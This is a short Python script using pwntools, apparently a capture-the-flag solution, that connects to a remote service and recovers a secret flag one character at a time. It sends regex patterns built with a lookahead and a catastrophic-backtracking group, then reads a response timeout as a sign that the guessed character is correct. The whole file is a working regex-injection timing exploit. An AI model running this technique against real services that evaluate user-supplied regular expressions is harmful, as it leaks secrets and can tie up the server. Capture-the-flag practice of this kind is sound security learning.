import string
from pwn import *

# 接続先
HOST = "34.170.146.252"
PORT = 64703

flag = "Alpaca{"
chars = string.ascii_letters + string.digits + "_}"
TIMEOUT = 1

while not flag.endswith("}"):
    with remote(HOST, PORT, level="debug") as io:
        for c in chars:
            io.recvuntil(b"regex> ")
            pattern = f"^(?={flag}{c})(((.*)*)*)*!"
            io.sendline(pattern.encode())
            if not io.recvline(timeout=TIMEOUT):
                flag += c
                break
    print(f"{flag = }")
